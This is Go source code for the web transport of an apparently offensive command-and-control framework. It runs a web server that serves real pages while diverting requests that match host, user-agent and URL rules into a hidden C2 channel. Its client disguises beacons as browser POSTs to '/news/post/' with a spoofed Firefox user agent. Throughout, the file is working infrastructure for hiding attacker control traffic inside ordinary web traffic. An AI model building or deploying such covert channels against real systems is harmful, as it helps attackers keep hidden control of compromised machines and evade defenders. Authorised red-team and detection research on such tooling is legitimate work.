package tcp

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"sync"
	"time"

	"github.com/iDigitalFlame/xmt/xmt/com/c2"
	"github.com/iDigitalFlame/xmt/xmt/util"
)

const (
	maxCons = 256
)

var (
	// DefaultClient is the HTTP CLient struct that is used when
	// the provided client is nil. This is a standard struct that uses
	// the RawDefaultTimeout as the timeout value and incorporates any proxy
	// settings from the environment.
	DefaultClient = &http.Client{
		Timeout: RawDefaultTimeout,
		Transport: &http.Transport{
			Proxy: http.ProxyFromEnvironment,
			DialContext: (&net.Dialer{
				Timeout:   RawDefaultTimeout,
				KeepAlive: RawDefaultTimeout,
				DualStack: true,
			}).DialContext,
			MaxIdleConns:          maxCons,
			IdleConnTimeout:       RawDefaultTimeout,
			TLSHandshakeTimeout:   RawDefaultTimeout,
			ExpectContinueTimeout: RawDefaultTimeout,
		},
	}

	// DefaultGenerator is the generator used if no generator is provided when
	// a client attempts a connection. The default values are a URL for an API
	// and Firefox version 64 user agent.
	DefaultGenerator = &WebGenerator{
		URL:   util.String("/news/post/"),
		Agent: util.String("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0"),
	}

	bufs = &sync.Pool{
		New: func() interface{} {
			return new(bytes.Buffer)
		},
	}
)

// Web is a C2 profile that mimics a standard web server and
// client setup. This struct inherits the http.Server struct and can
// be used to serve real files and pages. Use the Mapper struct to
// provide a URL mapping that can be used by clients to access the C2
// functions.
type Web struct {
	Client    *http.Client
	Generator *WebGenerator

	ctx     context.Context
	tls     *tls.Config
	dial    *net.Dialer
	lock    *sync.Mutex
	rules   []*WebRule
	cancel  context.CancelFunc
	handler *http.ServeMux
}

// WebRule is a struct that represents a rule set
// used by the Web server to determine the difference between
// normal and C2 traffic.
type WebRule struct {
	URL   util.Regexp
	Host  util.Regexp
	Agent util.Regexp
}

// WebClient is a simple struct that supports the
// C2 client connector interface. This can be used by
// clients to connect to a Web instance. By default, this
// struct will use the DefaultClient instance.
type WebClient struct {
	Generator *WebGenerator
	*http.Client
}
type webClient struct {
	gen    *WebGenerator
	buf    *bytes.Buffer
	host   string
	reader *http.Response
	client *http.Client
	parent *Web
}
type webListener struct {
	new      chan *webConnection
	ctx      context.Context
	host     *url.URL
	cancel   context.CancelFunc
	parent   *Web
	listener net.Listener
	*http.Server
}

// WebGenerator is a struct that is composed of three separate
// fmt.Stringer interfaces. These are called via their 'String'
// function to specify the User-Agent, URL and Host string values.
// They can be set to static strings using the 'util.String' wrapper.
// This struct can be used as a C2 client connector. If the Client
// property is not set, the DefaultClient value will be used.
type WebGenerator struct {
	URL   fmt.Stringer
	Host  fmt.Stringer
	Agent fmt.Stringer
}
type webConnection struct {
	close  chan bool
	reader *http.Request
	writer io.Writer
}

// Close terminates this Web instance and signals
// all current listeners and clients to disconnect.
// This will close all connections related to this struct.
func (w *Web) Close() error {
	w.cancel()
	return nil
}
func (w *webListener) listen() {
	if w.Server.TLSConfig != nil {
		w.Server.ServeTLS(w.listener, "", "")
	} else {
		w.Server.Serve(w.listener)
	}
	w.cancel()
}
func (w *webClient) IP() string {
	return w.reader.Request.RemoteAddr
}

// Rule adds the specified rules to the Web instance to
// assist in determing real and C2 traffic.
func (w *Web) Rule(r ...*WebRule) {
	if r == nil || len(r) == 0 {
		return
	}
	w.lock.Lock()
	defer w.lock.Unlock()
	if w.rules == nil {
		w.rules = make([]*WebRule, 0, len(r))
	}
	w.rules = append(w.rules, r...)
}
func (w *webClient) Close() error {
	if w.reader == nil {
		return nil
	}
	return w.reader.Body.Close()
}
func (w *webConnection) IP() string {
	return w.reader.RemoteAddr
}
func (w *webListener) Close() error {
	defer func() { recover() }()
	w.cancel()
	close(w.new)
	return w.listener.Close()
}
func (w *webListener) String() string {
	return fmt.Sprintf("Web: %s", w.listener.Addr().String())
}
func (w *webConnection) Close() error {
	err := w.reader.Body.Close()
	w.close <- true
	return err
}

// Handle registers the handler for the given pattern.
// If a handler already exists for pattern, Handle panics.
func (w *Web) Handle(s string, h http.Handler) {
	w.handler.Handle(s, h)
}
func (w *Web) checkMatch(r *http.Request) bool {
	if len(w.rules) == 0 {
		return false
	}
	w.lock.Lock()
	defer w.lock.Unlock()
	for i := range w.rules {
		if w.rules[i].checkMatch(r) {
			return true
		}
	}
	return false
}
func (w *webClient) Read(b []byte) (int, error) {
	if w.reader == nil {
		var err error
		w.reader, err = w.request(w.buf)
		w.buf.Reset()
		bufs.Put(w.buf)
		w.buf = nil
		if err != nil {
			return 0, err
		}
	}
	return w.reader.Body.Read(b)
}
func (w *webClient) Write(b []byte) (int, error) {
	if w.buf == nil {
		w.buf = bufs.Get().(*bytes.Buffer)
	}
	return w.buf.Write(b)
}
func (m *WebRule) checkMatch(r *http.Request) bool {
	if m.Host != nil && !m.Host.MatchString(r.Host) {
		return false
	}
	if m.Agent != nil && !m.Agent.MatchString(r.UserAgent()) {
		return false
	}
	if m.URL != nil && !m.URL.MatchString(r.URL.EscapedPath()) {
		return false
	}
	return true
}

// NewWeb creates a new Web C2 server instance. This can be passed
// to the Listen function of a controller to serve a Web Server that
// also acts as a C2 instance. This struct supports all the default
// Golang http.Server functions and can be used to serve real web pages.
// Rules must be defined using the 'Rule' function to allow the server to
// differentiate between C2 and real traffic.
func NewWeb(t time.Duration, g *WebGenerator) *Web {
	w := &Web{
		dial: &net.Dialer{
			Timeout:   t,
			KeepAlive: t,
			DualStack: true,
		},
		lock:      &sync.Mutex{},
		rules:     make([]*WebRule, 0),
		handler:   &http.ServeMux{},
		Generator: g,
	}
	w.ctx, w.cancel = context.WithCancel(context.Background())
	w.Client = &http.Client{
		Timeout: t,
		Transport: &http.Transport{
			Dial:                  w.dial.Dial,
			Proxy:                 http.ProxyFromEnvironment,
			DialContext:           w.dial.DialContext,
			MaxIdleConns:          maxCons,
			IdleConnTimeout:       w.dial.Timeout,
			TLSHandshakeTimeout:   w.dial.Timeout,
			ExpectContinueTimeout: w.dial.Timeout,
		},
	}
	return w
}
func (w *webConnection) Read(b []byte) (int, error) {
	return w.reader.Body.Read(b)
}

// Listen returns a new C2 listener for this Web instance. This
// function creates a separate server, but still shares the handler for the
// base Web instance that it's created from.
func (w *Web) Listen(a string) (c2.Listener, error) {
	var err error
	var c net.Listener
	if w.tls != nil {
		if (w.tls.Certificates == nil || len(w.tls.Certificates) == 0) || w.tls.GetCertificate == nil {
			return nil, ErrInvalidTLSConfig
		}
		c, err = tls.Listen(network, a, w.tls)
	} else {
		c, err = net.Listen(network, a)
	}
	if err != nil {
		return nil, err
	}
	l := &webListener{
		new:    make(chan *webConnection, maxCons),
		parent: w,
		Server: &http.Server{
			TLSConfig:         w.tls,
			Handler:           &http.ServeMux{},
			ReadTimeout:       w.dial.Timeout,
			WriteTimeout:      w.dial.Timeout,
			ReadHeaderTimeout: w.dial.Timeout,
		},
		listener: c,
	}
	l.ctx, l.cancel = context.WithCancel(w.ctx)
	l.Server.Handler.(*http.ServeMux).Handle("/", l)
	go l.listen()
	return l, nil
}
func (w *webConnection) Write(b []byte) (int, error) {
	return w.writer.Write(b)
}
func (w *webListener) Accept() (c2.Connection, error) {
	select {
	case <-w.ctx.Done():
		return nil, w.ctx.Err()
	case n := <-w.new:
		return n, nil
	}
}

// Connect creates a C2 client connector that uses the same properties of
// the Web struct that creates this.
func (w *Web) Connect(a string) (c2.Connection, error) {
	c := &webClient{
		gen:    w.Generator,
		host:   a,
		parent: w,
	}
	if c.gen == nil {
		c.gen = DefaultGenerator
	}
	return c, nil
}

// Connect creates a C2 client connector that uses the same properties of
// the WebClient and Generator instances that creates this.
func (w *WebClient) Connect(a string) (c2.Connection, error) {
	c := &webClient{
		gen:    w.Generator,
		host:   a,
		client: w.Client,
	}
	if c.gen == nil {
		c.gen = DefaultGenerator
	}
	return c, nil
}
func (w *webClient) request(b *bytes.Buffer) (*http.Response, error) {
	r, err := http.NewRequest(http.MethodPost, "", b)
	if err != nil {
		return nil, err
	}
	if w.parent != nil {
		r = r.WithContext(w.parent.ctx)
	}
	if i, err := url.Parse(w.host); err == nil {
		r.URL = i
	}
	if len(r.URL.Host) == 0 {
		r.URL.Host = w.host
		r.URL.Scheme = ""
	}
	if len(r.URL.Scheme) == 0 {
		if w.parent != nil && w.parent.tls != nil {
			r.URL.Scheme = "https"
		} else {
			r.URL.Scheme = "http"
		}
	}
	var u string
	if w.gen != nil && w.gen.URL != nil {
		u = w.gen.URL.String()
	}
	if len(u) > 1 && u[0] != '/' {
		r.URL.Path = fmt.Sprintf("/%s", u)
	} else {
		r.URL.Path = u
	}
	if w.gen != nil && w.gen.Host != nil {
		r.Host = w.gen.Host.String()
	}
	if w.gen != nil && w.gen.Agent != nil {
		r.Header.Set("User-Agent", w.gen.Agent.String())
	}
	var o *http.Response
	if w.client != nil {
		o, err = w.client.Do(r)
	} else if w.parent != nil {
		o, err = w.parent.Client.Do(r)
	} else {
		o, err = DefaultClient.Do(r)
	}
	if err != nil {
		return nil, err
	}
	if o.Body == nil {
		return nil, io.ErrUnexpectedEOF
	}
	return o, nil
}
func (w *webListener) ServeHTTP(o http.ResponseWriter, r *http.Request) {
	if r.Body != nil && w.parent.checkMatch(r) {
		c := &webConnection{
			close:  make(chan bool),
			reader: r,
			writer: o,
		}
		w.new <- c
		<-c.close
	} else {
		w.parent.handler.ServeHTTP(o, r)
	}
}

// HandleFunc registers the handler function for the given pattern.
func (w *Web) HandleFunc(s string, h func(http.ResponseWriter, *http.Request)) {
	w.handler.HandleFunc(s, h)
}
